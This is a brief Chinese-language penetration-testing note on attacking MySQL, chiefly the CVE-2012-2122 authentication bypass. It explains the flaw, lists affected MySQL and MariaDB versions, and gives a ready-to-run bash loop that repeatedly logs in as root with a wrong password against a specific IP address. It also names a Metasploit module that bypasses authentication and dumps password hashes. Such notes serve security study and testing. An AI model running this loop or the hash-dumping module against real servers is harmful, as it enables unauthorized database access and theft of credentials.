# mysql
## mysql弱口令
...这个没啥好说的

## mysql身份绕过CVE-2012-2122
当连接MariaDB/MySQL时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。 也就是说只要知道用户名，不断尝试就能够直接登入SQL数据库。按照公告说法大约256次就能够蒙对一次
### 影响范围
MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23 
MySQL versions from 5.1.63, 5.5.24, 5.6.6 
### 验证方法
'''bash
for i in `seq 1 1000`; do mysql -u root --password=bad -h 101.200.238.97 2>/dev/null; done
'''

msfconsole:
auxiliary/scanner/mysql/mysql_authbypass_hashdump

poc:
poc_mysql_auth_bypass.py